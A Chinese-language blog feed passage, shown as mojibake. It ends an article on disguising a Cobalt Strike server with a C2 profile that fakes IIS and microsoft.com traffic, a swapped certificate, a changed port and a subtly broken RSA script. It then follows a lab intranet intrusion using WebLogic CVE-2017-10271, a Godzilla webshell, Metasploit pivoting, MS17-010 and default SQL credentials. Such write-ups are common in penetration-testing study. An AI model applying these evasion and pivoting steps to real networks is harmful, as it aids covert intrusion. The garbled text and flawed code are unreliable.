class="hljs-string">&quot;kepp-alive&quot;</span><span class="hljs-comment">; </span><br>        header <span class="hljs-string">&quot;Pragma&quot;</span> <span class="hljs-string">&quot;no-cache&quot;</span><span class="hljs-comment">;</span><br>        header <span class="hljs-string">&quot;Cache-Control&quot;</span> <span class="hljs-string">&quot;no-cache&quot;</span><span class="hljs-comment">;</span><br>        id &#123;<br>            netbiosu<span class="hljs-comment">;</span><br>            append <span class="hljs-string">&quot;.png&quot;</span><span class="hljs-comment">;</span><br>            uri-append<span class="hljs-comment">;</span><br>        &#125;<br>        output &#123;<br>            netbios<span class="hljs-comment">;</span><br>            print<span class="hljs-comment">;</span><br>        &#125;<br>    &#125;<br>    server &#123;<br>        header <span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-string">&quot;img/jpg&quot;</span><span class="hljs-comment">;</span><br>        header <span class="hljs-string">&quot;Server&quot;</span> <span class="hljs-string">&quot;Microsoft-IIS/6.0&quot;</span><span class="hljs-comment">;</span><br>        header <span class="hljs-string">&quot;X-Powered-By&quot;</span> <span class="hljs-string">&quot;ASP.NET&quot;</span><span class="hljs-comment">;</span><br>        output &#123;<br>            netbios<span class="hljs-comment">;</span><br>            print<span class="hljs-comment">;</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯¥æ–‡ä»¶çš„å…·ä½“ç»†èŠ‚å°±ä¸å†è¿‡å¤šæè¿°äº†ï¼Œå¾ˆå¤šåšå®¢æˆ–è€…å®˜ç½‘éƒ½æœ‰ç›¸å…³ä»‹ç»<br>æ¥ç€æˆ‘ä»¬å¯ä»¥ç”¨CSè‡ªå¸¦çš„c2lintéªŒè¯ä¸€ä¸‹å…¶æ­£ç¡®æ€§(è¿™é‡Œæˆ‘åœ¨ä½¿ç”¨c2lintçš„æ—¶å€™ä¸€ç›´æŠ¥é”™ï¼Œæ›´æ¢äº†å¤šä¸ªç‰ˆæœ¬çš„CSä¹‹åï¼Œè®¤ä¸ºåº”è¯¥æ˜¯åœ¨ç ´è§£CSæ—¶ä½¿å¾—åŸå…ˆçš„è§£å¯†åŠŸèƒ½å‡ºç°é—®é¢˜)<br>æˆ‘ä»¬ä½¿ç”¨c2lintä¸»è¦æ˜¯ä¸ºäº†æŸ¥çœ‹æŠ¥é”™ä¿¡æ¯ï¼ŒéªŒè¯å…¶æ­£ç¡®æ€§ï¼Œå†™å¥½çš„profileåœ¨ä¸åŒç‰ˆæœ¬CSéƒ½æ˜¯å¯ä»¥ç›´æ¥ç”¨çš„<br><img src="https://s2.loli.net/2023/03/16/Op92YAwGnsF1uEt.png" alt="get"><br><img src="https://s2.loli.net/2023/03/16/pws2EbxnJ9t1PIK.png" alt="post"><br>è¿™é‡Œæœ‰å‡ ä¸ªç»†èŠ‚ï¼Œä¸ºäº†ä½¿æˆ‘ä»¬ä¼ªé€ çš„æµé‡æ›´åŠ çœŸå®ï¼Œæˆ‘æ„é€ äº† <code>Host: microsoft.com</code>ã€<code>Cookie: skin=noskin;session-token=oojkadhmklofeajgobnlkakdnolejdflcsm-hit=s-24KU11BB82RZSYGJ3BDK|1419899012996</code>ã€<code>Server: Microsoft-IIS/6.0</code></p><h2 id="æ›´æ¢è¯ä¹¦"><a href="#æ›´æ¢è¯ä¹¦" class="headerlink" title="æ›´æ¢è¯ä¹¦"></a>æ›´æ¢è¯ä¹¦</h2><p>è¿™é‡Œç”¨åˆ°jdkè‡ªå¸¦çš„ä¸€ä¸ªå·¥å…·keytoolï¼ŒKeytoolæ˜¯ä¸€ä¸ªJavaæ•°æ®è¯ä¹¦çš„ç®¡ç†å·¥å…·ï¼Œå°†å¯†é’¥ï¼ˆkeyï¼‰å’Œè¯ä¹¦ï¼ˆcertificatesï¼‰å­˜åœ¨ä¸€ä¸ªç§°ä¸ºkeystoreçš„æ–‡ä»¶ä¸­,å³storeåç¼€æ–‡ä»¶ä¸­ã€‚<br>æˆ‘ä»¬è¿™é‡Œç”¨åˆ°çš„æŒ‡ä»¤æ˜¯<code>keytool -genkey -alias glacier -storepass glacier123 -keypass glacier123 -keyalg RSA -validity 36500 -keystore glacier.store</code><br>-alias è¦å¤„ç†çš„æ¡ç›®çš„åˆ«å -storepass å¯†é’¥åº“å£ä»¤ -keypass å¯†é’¥å£ä»¤ -keyalg å¯†é’¥ç®—æ³•åç§° -validity æœ‰æ•ˆå¤©æ•° -keystore å¯†é’¥åº“åç§°<br>è®°ä½è¿™é‡Œçš„storeåç§°ä¸å£ä»¤<br>æ¥ç€å¡«å†™è¯ä¹¦çš„ç›¸å…³ä¿¡æ¯<br><img src="https://s2.loli.net/2023/03/16/mzW7roATQyqXHKd.png"><br>æœ€åä¿®æ”¹teamseverï¼Œä¸€èˆ¬éƒ½æ˜¯å†™åœ¨æœ€åä¸€è¡Œï¼Œå°†åŸå…ˆçš„cobalstrike.storeæ›´æ¢ä¸ºæˆ‘ä»¬æ–°ç”Ÿæˆçš„glacier.store,æŠŠå¯¹åº”çš„å¯†é’¥åº“å£ä»¤ä¹Ÿæ”¹æˆæˆ‘ä»¬æ–°è®¾ç½®çš„å£ä»¤<br><code>-Djavax.net.ssl.keyStore=./glacier.store -Djavax.net.ssl.keyStorePassword=glacier123</code><br>ä¸ºäº†é¿å…CSé‚£æ˜¾çœ¼çš„50050ç«¯å£ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æŠŠå®ƒæ”¹ä¸€ä¸‹ï¼Œæ”¹æˆ2200<br>ä½¿ç”¨<code>keytool -list -v -keystore glacier.store </code>æŸ¥çœ‹ä¸€ä¸‹æˆ‘ä»¬è¯ä¹¦çš„ä¿¡æ¯ï¼Œå†å¯åŠ¨teamseverï¼Œå¯¹æ¯”å…¶æ˜¯å¦ä¸€è‡´<br><img src="https://s2.loli.net/2023/03/16/7NEGoVR5ZgvasY2.png"><br>å¯åŠ¨teamseverï¼Œå®¢æˆ·ç«¯èƒ½æˆåŠŸè¿ä¸Š</p><h2 id="æµé‡åŠ å¯†"><a href="#æµé‡åŠ å¯†" class="headerlink" title="æµé‡åŠ å¯†"></a>æµé‡åŠ å¯†</h2><p>Cobalt Strikeæ”¯æŒè‡ªå®šä¹‰çš„åŠ å¯†å’Œæ··æ·†è„šæœ¬ï¼Œæˆ‘ä»¬å¯ä»¥å†™ä¸ªç®€å•çš„è„šæœ¬æ¥å¯¹æµé‡è¿›è¡ŒåŠ å¯†ï¼Œä»¥æ­¤æ¥éšè—å…¶æµé‡ç‰¹å¾</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> PKCS1_OAEP<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encrypt</span>(<span class="hljs-params">data</span>):</span><br>    key = RSA.generate(<span class="hljs-number">2048</span>) <span class="hljs-comment"># ç”Ÿæˆä¸€ä¸ª RSA å¯†é’¥å¯¹</span><br>    cipher = PKCS1_OAEP.new(key.publickey()) <span class="hljs-comment"># åˆ›å»º PKCS1_OAEP åŠ å¯†å¯¹è±¡</span><br>    key_str = key.export_key().decode() <span class="hljs-comment"># å¯¼å‡ºå…¬é’¥å­—ç¬¦ä¸²</span><br>    encrypted_key = cipher.encrypt(<span class="hljs-built_in">str</span>(random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">1000000</span>)).encode()) <span class="hljs-comment"># ç”¨å…¬é’¥åŠ å¯†éšæœºå¯†é’¥</span><br>    encrypted_data = base64.b64encode(cipher.encrypt(data.encode())).decode() <span class="hljs-comment"># ç”¨å…¬é’¥åŠ å¯†æ•°æ®å¹¶è¿›è¡Œ Base64 ç¼–ç </span><br>    <span class="hljs-keyword">return</span> key_str, base64.b64encode(encrypted_key).decode(), encrypted_data<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decrypt</span>(<span class="hljs-params">key_str, encrypted_key, encrypted_data</span>):</span><br>    key = RSA.import_key(key_str.encode()) <span class="hljs-comment"># å¯¼å…¥ç§é’¥</span><br>    cipher = PKCS1_OAEP.new(key) <span class="hljs-comment"># åˆ›å»º PKCS1_OAEP è§£å¯†å¯¹è±¡</span><br>    decrypted_key = <span class="hljs-built_in">int</span>(cipher.decrypt(base64.b64decode(encrypted_key))) <span class="hljs-comment"># ç”¨ç§é’¥è§£å¯†éšæœºå¯†é’¥</span><br>    decrypted_data = cipher.decrypt(base64.b64decode(encrypted_data)).decode() <span class="hljs-comment"># ç”¨ç§é’¥è§£å¯†æ•°æ®å¹¶è¿›è¡Œ Base64 è§£ç </span><br>    <span class="hljs-keyword">return</span> decrypted_data<br></code></pre></td></tr></table></figure><p>è¿™é‡Œç”¨åˆ°çš„æ˜¯RSAç®—æ³•ï¼Œå°†æ•°æ®å’Œä¸€ä¸ªéšæœºçš„å¯†é’¥è¿›è¡ŒåŠ å¯†<br>å°†è¯¥è„šæœ¬ä¸Šä¼ åˆ°serverç«¯ï¼Œå¯ä»¥åœ¨Beacon çš„é…ç½®æ–‡ä»¶ä¸­æŒ‡å®šè¯¥è„šæœ¬çš„è·¯å¾„ï¼Œå¹¶å°† post-execute é€‰é¡¹è®¾ç½®ä¸º execï¼Œä»¥ä¾¿åœ¨ Beacon è¿æ¥åˆ° C2 æœåŠ¡å™¨æ—¶è‡ªåŠ¨æ‰§è¡Œè¯¥è„šæœ¬ã€‚</p><hr><p>å‚è€ƒæ–‡ç« ï¼š<br><a href="https://www.freebuf.com/news/189948.html">https://www.freebuf.com/news/189948.html</a><br><a href="https://blog.csdn.net/m0_50526465/article/details/116465013#comments_18814516">https://blog.csdn.net/m0_50526465/article/details/116465013#comments_18814516</a><br><a href="https://wxiaoge.blog.csdn.net/article/details/126128872?spm=1001.2014.3001.5502">https://wxiaoge.blog.csdn.net/article/details/126128872?spm=1001.2014.3001.5502</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cobaltstrike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å†…ç½‘æ¸—é€è®°å½•1</title>
      <link href="2023/01/17/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%951/"/>
      <url>2023/01/17/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%951/</url>
      
        <content type="html"><![CDATA[<p>è¿™ç¯‡æ–‡ç« å‡†å¤‡ç³»ç»Ÿæ€§çš„è®°å½•ä¸€ä¸‹ï¼Œä»å†…ç½‘ä»£ç†ï¼Œéš§é“é€šä¿¡ç­‰åŸç†ï¼Œåˆ°é¶æœºæ­å»ºï¼Œå†…ç½‘ç¯å¢ƒæ„ç­‘ï¼Œæ¥å®é™…æ„Ÿå—ä¸‹å†…ç½‘æ¸—é€</p><a id="more"></a><h1 id="ç†è®ºçŸ¥è¯†"><a href="#ç†è®ºçŸ¥è¯†" class="headerlink" title="ç†è®ºçŸ¥è¯†"></a>ç†è®ºçŸ¥è¯†</h1><p>ä»£ç†</p><blockquote><p>ä»£ç†çš„æ ¸å¿ƒï¼Œæ˜¯ä¸ºäº†è§£å†³ä¸å‡ºç½‘é—®é¢˜ï¼Œæ¯”å¦‚ï¼ŒAä¸»æœºåœ¨å¤–ç½‘ï¼Œbä¸»æœºåœ¨å†…ç½‘ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œå°±æ˜¯æŠŠAä¸»æœºå½“æˆè·³æ¿å»è®¿é—®Bä¸»æœº<br>éš§é“<br>éš§é“çš„æ ¸å¿ƒï¼Œæ˜¯ä¸ºäº†è§£å†³åè®®é—®é¢˜ï¼Œæ¯”å¦‚ç¦ç”¨äº†httpï¼Œæˆ–è€…tcpåè®®ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œå°±è¦å»è€ƒè™‘ä½¿ç”¨æ›´ä½çº§çš„åè®®ï¼Œæ¯”å¦‚icmpç­‰ç­‰<br><img src="https://s2.loli.net/2023/01/16/8RdpZvUsIOJVtNA.png"></p></blockquote><p>è€Œè¿æ¥é€šä¿¡çš„åŸºæœ¬æ–¹å¼åˆ†ä¸ºä¸¤ç§</p><blockquote><p>æ­£å‘ğŸ bind<br>hackerç›´æ¥å»è¿æ¥é¶æœº<br>åå‘ğŸ reverse_tcp<br>é¶æœºåå‘æ¥è¿æ¥hacker</p></blockquote><h2 id="cs-amp-msf-socksä»£ç†ä½¿ç”¨"><a href="#cs-amp-msf-socksä»£ç†ä½¿ç”¨" class="headerlink" title="cs&amp;msf_socksä»£ç†ä½¿ç”¨"></a>cs&amp;msf_socksä»£ç†ä½¿ç”¨</h2><p>åœ¨CSä¸­ï¼Œæ˜¯å¯ä»¥å¾ˆæ–¹ä¾¿çš„ä½¿ç”¨socksä»£ç†ï¼Œè¿™é‡Œå› ä¸ºç‰ˆæœ¬æ˜¯4.3ï¼Œæ‰€ä»¥åªæœ‰socks4aï¼Œåœ¨åç»­ç‰ˆæœ¬å¯ä»¥é€‰æ‹©socks5ç­‰æ¥é€šä¿¡<br><img src="https://s2.loli.net/2023/01/17/6bQBDaJU5pzCZm3.png"><br>æ¥ç€ä¼šå¼€æ”¾ä¸€ä¸ªç«¯å£ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯Proxifieræ¥æŒ‚èµ·ä»£ç†<br>è€Œä½¿ç”¨msfå¯èƒ½ä¼šç›¸å¯¹éº»çƒ¦ä¸€ç‚¹ï¼Œæ¯•ç«ŸCSæ˜¯å†…ç½‘ç¥å™¨</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros">æŸ¥çœ‹è·¯ç”±<br>arp -a<br>æ·»åŠ è·¯ç”±<br><span class="hljs-builtin-name">run</span> post/multi/manage/autoroute<br>æŸ¥çœ‹è·¯ç”±<br><span class="hljs-builtin-name">run</span> autoroute -p<br>è®¾ç½®socksä»£ç†<br>use auxiliary/server/socks_proxy<br><span class="hljs-builtin-name">set</span> srvhost 0.0.0.0<br><span class="hljs-builtin-name">set</span> srvport 1115<br>run<br></code></pre></td></tr></table></figure><h1 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h1><blockquote><p>kali linux (ç½‘å¡ä¸ºæ¡¥æ¥)<br>windows server2012 R2(å¤–ç½‘æœºå™¨ï¼Œä¸¤å¼ ç½‘å¡ï¼Œä¸€ä¸ªæ˜¯æ¡¥æ¥ï¼Œä¸€ä¸ªæ˜¯vm2)<br>windows 7 x 64 (ä¸¤å¼ ç½‘å¡ï¼Œä¸€ä¸ªæ˜¯vm2ï¼Œä¸€ä¸ªæ˜¯vm4[è¿™ä¸ªvm4æ˜¯ç½‘æ®µæ˜¯10.10.10.0<br>255.255.255.255])<br>windows Server 2008 R2 x64(sqlæœåŠ¡å™¨ ç½‘å¡ä¸ºvm4)<br>windows Server 2008 R2 x64(DC åŸŸæ§+owa  ç½‘å¡ä¸ºvm4)</p></blockquote><p>è¿™é‡Œæ”¾ä¸€å¼ å›¾ï¼Œå°±èƒ½å¾ˆå¥½çš„ç†è§£æ•´ä¸ªå†…ç½‘æ¡†æ¶äº†<br><img src="https://s2.loli.net/2023/01/17/gwhdm8Pyf7TWRDt.png"></p><h1 id="æ¸—é€"><a href="#æ¸—é€" class="headerlink" title="æ¸—é€"></a>æ¸—é€</h1><p>æ¸—é€çš„æœ¬è´¨æ˜¯ä¿¡æ¯æ”¶é›†ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆå¼€å§‹ç¬¬ä¸€æ­¥ï¼Œåœ¨kaliçš„åŒç½‘æ®µä¸‹å¼€å§‹æ‰«æå­˜æ´»ä¸»æœº</p><h2 id="æ”»é™·WEBæœåŠ¡å™¨"><a href="#æ”»é™·WEBæœåŠ¡å™¨" class="headerlink" title="æ”»é™·WEBæœåŠ¡å™¨"></a>æ”»é™·WEBæœåŠ¡å™¨</h2><p>å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬è¿™é‡Œæ‰«åˆ°äº†ä¸€ä¸ªweblogicçš„ä¸»æœº<br><img src="https://s2.loli.net/2023/01/17/RVSzmk4J8ZhKci2.png"><br>æˆ‘ä»¬ä¹Ÿè‚¯å®¹æ˜“çŸ¥é“ï¼Œweblogicæ˜¯åœ¨7001ç«¯å£ä¸‹çš„ï¼Œé‚£æˆ‘ä»¬è¯•ç€è®¿é—®ä¸€ä¸‹<br><img src="https://s2.loli.net/2023/01/17/VlOCNosB3ZLnz9p.png"><br>å‘ç°æˆåŠŸè®¿é—®äº†ï¼Œè¯´æ˜è¿™å°ä¸»æœºæ˜¯æ­£å¸¸å¼€å¯äº†weblogicæœåŠ¡çš„<br>weblogicçš„å†å²ååºåˆ—åŒ–æ¼æ´å¤ªå¤šäº†ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å…ˆç”¨è‡ªåŠ¨åŒ–å·¥å…·æµ‹è¯•ä¸€ä¸‹ï¼Œçœ‹çœ‹æ˜¯å¦å­˜åœ¨å·²æœ‰çš„æ¼æ´ï¼Œå¯ä»¥ç›´æ¥åˆ©ç”¨<br><img src="https://s2.loli.net/2023/01/17/U8QxS2kKetfCTHr.png"><br>å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬ç»è¿‡æ¯ä¸ªæ¼æ´çš„æµ‹è¯•ï¼Œå¯ä»¥åˆ¤æ–­å…¶å­˜åœ¨CVE-2017-10271 Weblogic12 XMLDecoderååºåˆ—åŒ–æ¼æ´<br>ç„¶åå°è¯•æ‰§è¡Œå‘½ä»¤<br><img src="https://s2.loli.net/2023/01/17/58X3pzq9FY7NJOh.png"><br>ä¹Ÿå¯ä»¥æ­£å¸¸å›æ˜¾ï¼Œé‚£æˆ‘ä»¬æ¥ç€å°±ä¸Šä¼ æ–‡ä»¶<br>è¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯å“¥æ–¯æ‹‰ï¼Œå› ä¸ºå®ƒæ–‡ä»¶ä¸Šä¼ æ˜¯jspæ–‡ä»¶ï¼Œç¬¬ä¸€æ—¶é—´å°±æƒ³åˆ°å“¥æ–¯æ‹‰äº†<br>è®¾ç½®å¥½å“¥æ–¯æ‹‰çš„ç <br><img src="https://s2.loli.net/2023/01/17/4yx5IZJuUaDizqd.png"><br>ç„¶åæŠŠå“¥æ–¯æ‹‰çš„ç å†…å®¹æ›¿æ¢ï¼Œä¼ ä¸Šå»<br><img src="https://s2.loli.net/2023/01/17/r7f9sq4tDHwT2jP.png"><br>å¾—åˆ°ä¸Šä¼ çš„è·¯å¾„ï¼Œæ¥ç€è®¿é—®ä¸€ä¸‹ï¼Œé¡ºåˆ©è¿ä¸Šå“¥æ–¯æ‹‰<br><img src="https://s2.loli.net/2023/01/17/8CmBRaSfOqvopKd.png"><br>è¿™æ ·æˆ‘ä»¬å°±æ‹¿åˆ°è¿™å°WEBæœåŠ¡å™¨çš„shelläº†ï¼Œä½†ä¸ºäº†æˆ‘ä»¬åç»­çš„å†…ç½‘æ¸—é€ï¼Œæ¨ªå‘ç§»åŠ¨ï¼Œæˆ‘ä»¬æŠŠä»–è¿åˆ°CSä¸Šé¢æ¥<br>ç”¨CSç”Ÿæˆä¸ªç ï¼Œä½¿ç”¨å“¥æ–¯æ‹‰æŠŠä»–ä¼ ä¸Šå»ï¼Œæ‰§è¡Œ<br><img src="https://s2.loli.net/2023/01/17/WiSNBXMwRVoJqnA.png"><br>ç„¶åCSæˆåŠŸä¸Šçº¿<br><img src="https://s2.loli.net/2023/01/17/Yemvlo1drQXWH7w.png"></p><h2 id="åˆ©ç”¨WEBæœåŠ¡å™¨å˜æˆè·³æ¿"><a href="#åˆ©ç”¨WEBæœåŠ¡å™¨å˜æˆè·³æ¿" class="headerlink" title="åˆ©ç”¨WEBæœåŠ¡å™¨å˜æˆè·³æ¿"></a>åˆ©ç”¨WEBæœåŠ¡å™¨å˜æˆè·³æ¿</h2><p>é¦–å…ˆæˆ‘ä»¬çœ‹ä¸€ä¸‹è¿™å°WEBæœåŠ¡å™¨çš„ç½‘ç»œä¿¡æ¯ï¼Œæ¥å…¥äº†å“ªäº›å±€åŸŸç½‘<br><img src="https://s2.loli.net/2023/01/17/ujdiSrHnFohI73y.png"><br>å¾ˆæ˜æ˜¾ï¼Œè¿™ä¸ª<code>10.10.20.12</code>å°±æ˜¯è¿™ä¸ªWEBæœåŠ¡å™¨æ‰€è¿æ¥çš„å†…ç½‘äº†<br>æˆ‘ä»¬å…ˆåˆ©ç”¨è¿™å°WEBæœåŠ¡å™¨ï¼Œå¯¹<code>10.10.20.0/24</code>æ‰€åœ¨ç½‘ç»œè¿›è¡Œæ‰«æå­˜æ´»ä¸»æœº<br><img src="https://s2.loli.net/2023/01/17/mpG8thiLHjPckRY.png"><br>å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬è¯¥ç½‘æ®µä¸‹ï¼Œå‘ç°äº†å¦ä¸€å°å­˜æ´»ä¸»æœº<code>10.10.20.7</code>ï¼Œé‚£ä¹ˆè¿™å°è‚¯å®šå°±æ˜¯å†…ç½‘çš„ä¸»æœºäº†<br><img src="https://s2.loli.net/2023/01/17/xBVqlaNILzu4XZD.png"><br>åŒæ—¶åœ¨targeté‡Œé¢ï¼Œä¹Ÿä¼šè®°å½•ä¸‹æˆ‘ä»¬æ‰€æ‰«æçš„åŒç½‘æ®µä¸‹çš„å­˜æ´»ä¸»æœº<br>ç°åœ¨æˆ‘ä»¬éœ€è¦åšçš„å°±æ˜¯ï¼Œå¦‚ä½•åˆ©ç”¨è¿™å°WEBæœåŠ¡å™¨å½“ä½œè·³æ¿è¿›è¡Œé€šä¿¡ï¼Œæ¥å°†è¿™å°å†…ç½‘ä¸»æœºçš„æƒé™æ‹¿åˆ°æ‰‹<br>åœ¨è¿™é‡Œæ¨èä¸€ä¸ªå·¥å…·ï¼Œ<code>fscan32</code>ï¼Œå®ƒçš„ä½“ç§¯å°ï¼Œä¸“é—¨é€‚ç”¨äºä¼ ä¸Šè·³æ¿æœºï¼Œæ‰«æå†…ç½‘<br>æˆ‘ä»¬ä½¿ç”¨fscan32ï¼Œç›´æ¥å¯¹10.10.20.7è¯¥ä¸»æœºè¿›è¡Œæ‰«æ<br><img src="https://s2.loli.net/2023/01/17/X7gJCyQaRn56bxT.png"><br>å¯ä»¥çœ‹åˆ°ç»“æœï¼Œå¾ˆæ˜æ˜¾ï¼Œå…¶å­˜åœ¨ms17_010å¯ä»¥ç›´æ¥åˆ©ç”¨ï¼Œé‚£æˆ‘ä»¬å°±å¾—ä¸Šmsfäº†<br>é¦–å…ˆï¼Œå¾—å…ˆæŠŠæˆ‘ä»¬ä¸Šçº¿csçš„è¿™å°WEBæœåŠ¡å™¨ï¼Œä¼ ç»™msf<br><img src="https://s2.loli.net/2023/01/17/tXasIGcJUOWT5n6.png"><br>è®¾ç½®å¥½csä¸­çš„hostä¸portï¼Œ<code>spawn msf</code>(è¿™é‡Œmsfæ˜¯csä¸­Listenersçš„åå­—)æ¥ä¼ é€’ç»™msf<br>åŒæ ·ï¼Œåœ¨msfä¸­è®¾ç½®å¥½å¯¹åº”çš„ç«¯å£<br><img src="https://s2.loli.net/2023/01/17/gkDp39o6xrwzB5m.png"><br>éšç€msfä¸csçš„é€šä¿¡æˆåŠŸï¼Œè¿™æ ·cså·²ç»ä¸Šçº¿çš„WEBæœåŠ¡å™¨ï¼ŒæˆåŠŸçš„äº¤ç»™äº†msfå»è¿›ä¸€æ­¥ä½¿ç”¨äº†<br><img src="https://s2.loli.net/2023/01/17/PoIlzFYDveGBMRH.png"><br>åˆ©ç”¨å‰é¢çš„ï¼Œmsfçš„socksä½¿ç”¨ï¼Œæˆ‘ä»¬å…ˆå»ºç«‹è·¯ç”±<br><img src="https://s2.loli.net/2023/01/17/TCUKsqiZYN3avEQ.png"><br>å»ºç«‹å¥½ä¹‹åï¼Œæ¥ç€å°±æ˜¯ç”¨æ°¸æ’ä¹‹è“ms17_010ç›´æ¥æ‰“<br><img src="https://s2.loli.net/2023/01/17/XWJr6lpPsg3Z1In.png"><br>æˆåŠŸæ‹¿ä¸‹<br><img src="https://s2.loli.net/2023/01/17/Ei1xA2PwmrZJNFI.png"><br>æ¥ç€æˆ‘ä»¬éœ€è¦å†æŠŠè¿™å°ä¸»æœºï¼Œä»msfä¸Šçº¿åˆ°csä¸Š<br>è¿™é‡Œæˆ‘é€‰æ‹©çš„æ˜¯æ­£å‘è¿æ¥ï¼Œåå‘è¿æ¥ä¹Ÿæ˜¯ä¸€æ ·<br><img src="https://s2.loli.net/2023/01/17/wV74ZsCE5fKJRYn.png"><br>ä½¿ç”¨msfæŠŠcsç”Ÿæˆçš„ç ä¼ ä¸Šå»<br><img src="https://s2.loli.net/2023/01/17/ODmX3Aun67L2tfe.png"><br>ä¼ ä¸Šå»ä¹‹åè¿è¡Œï¼Œå¹¶åŒæ—¶åœ¨csä¸­è¿›è¡Œconnect<br><img src="https://s2.loli.net/2023/01/17/ov5cXU2HwRD1MTf.png"><br>æˆåŠŸæ‹¿ä¸‹å…¶å†…ç½‘çš„ç¬¬ä¸€å°ä¸»æœº</p><h2 id="æ·±å…¥åŸŸä¸­"><a href="#æ·±å…¥åŸŸä¸­" class="headerlink" title="æ·±å…¥åŸŸä¸­"></a>æ·±å…¥åŸŸä¸­</h2><p>åŒç†ï¼Œæˆ‘ä»¬æ‹¿åˆ°è¿™å°å†…ç½‘ä¸»æœºä¹‹åï¼Œå…ˆæŸ¥çœ‹ä¸€ä¸‹å®ƒçš„ç½‘ç»œæƒ…å†µ<br><img src="https://s2.loli.net/2023/01/17/oceHafEQWvKOjFA.png"><br>å¯ä»¥çœ‹åˆ°ï¼Œ<code>10.10.20.7</code>æ˜¯ä¸WEBæœåŠ¡å™¨ç›¸è¿çš„ï¼Œè€Œ<code>10.10.10.7</code>è‚¯å®šå°±æ˜¯å…¶åŸŸå†…çš„ç½‘æ®µäº†<br>æˆ‘ä»¬å¯ä»¥å…ˆç”¨cséå¸¸æ–¹ä¾¿çš„å»ºç«‹ä¸€ä¸ªsocks4açš„é€šé“<br><img src="https://s2.loli.net/2023/01/17/SNO4DUgz82PMHsy.png"><br>æ¥ç€å¯¹<code>10.10.10.0/24</code>å¯¹å­˜æ´»ä¸»æœºè¿›è¡Œæ‰«æ<br><img src="https://s2.loli.net/2023/01/17/MWs7Xq3ivKUe8Jm.png"><br>ç”±æ‰«æç»“æœå¯ä»¥çŸ¥é“ï¼Œåœ¨è¯¥åŸŸå†…ï¼Œé™¤äº†æœ¬ä¸»æœºï¼Œè¿˜å­˜åœ¨å¦å¤–ä¸¤å°å­˜æ´»ä¸»æœº<br>æˆ‘ä»¬åˆ†åˆ«ä»”ç»†åœ°æ‰«æä¸€ä¸‹çœ‹çœ‹ç»“æœ<br>å…ˆçœ‹<code>10.10.10.8</code>è¿™å°ä¸»æœº<br><img src="https://s2.loli.net/2023/01/17/epNu8AXa2JUDS6M.png"><br>æœ‰æ‰«æå‡ºæ¥çš„ä¿¡æ¯å¯ä»¥çœ‹åˆ°ï¼Œè¿™å°å¸¦æ¦‚ç‡å°±æ˜¯åŸŸæ§äº†<br>ä½†æ˜¯åŸŸæ§æ²¡æœ‰æ‰«æå‡ºä»€ä¹ˆç»“æœï¼Œåè€Œæ˜¯å¦å¤–ä¸€æ¡sqlçš„æœåŠ¡å™¨ç›´æ¥çˆ†å‡ºäº†ç”¨æˆ·åå’Œå£ä»¤<br><img src="https://s2.loli.net/2023/01/17/7JH4MUvmID3rVfG.png"><br>å¯ä»¥çœ‹åˆ°ï¼Œå…¶ç”¨æˆ·åä¸å£ä»¤åˆ†åˆ«æ˜¯<code>sa</code>ã€<code>sa</code><br>è¿™é‡Œæ¨èä¸€ä¸ªå·¥å…·<code>MDUT</code>ï¼Œå¯ä»¥ç›´æ¥è¿æ¥å„ç§æ•°æ®åº“ï¼Œä¸€é”®æ‰§è¡Œ<br><img src="https://s2.loli.net/2023/01/17/XVb27M1CYlv5t3W.png"><br>æˆåŠŸè¿ä¸Šä¹‹åï¼Œæµ‹è¯•ä¸€ä¸‹ï¼Œå¯ä»¥æ­£å¸¸æ‰§è¡Œå‘½ä»¤<br><img src="https://s2.loli.net/2023/01/17/9Wvg46CIDsxewYR.png"><br>é‚£æˆ‘ä»¬æ¥ç€å°±ä¸Šä¼ æ–‡ä»¶ï¼Œè¿˜æ˜¯è·Ÿä¹‹å‰ä¸€æ ·ï¼Œç”¨csç”Ÿæˆä¸ªç ä¼ ä¸Šå»å°±å¥½äº†<br><img src="https://s2.loli.net/2023/01/17/UIyFXvpsexAaMzo.png"></p><h2 id="æ‹¿ä¸‹åŸŸæ§"><a 